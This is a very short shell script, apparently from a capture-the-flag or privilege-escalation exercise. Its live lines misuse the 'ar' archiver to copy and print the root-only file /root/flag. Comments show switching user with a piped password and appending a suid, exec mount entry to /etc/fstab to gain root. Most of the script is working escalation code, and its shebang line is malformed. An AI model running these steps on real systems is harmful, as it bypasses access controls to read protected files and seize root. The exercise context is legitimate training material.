#!/usr/bash

# echo "now" | su cmp

# cat /root/flag

# echo 'test /mnt ext2 user,suid,exec,loop 0 0' >> /etc/fstab

TF=$(mktemp -u)
LFILE=/root/flag
ar r "$TF" "$LFILE"
cat "$TF"
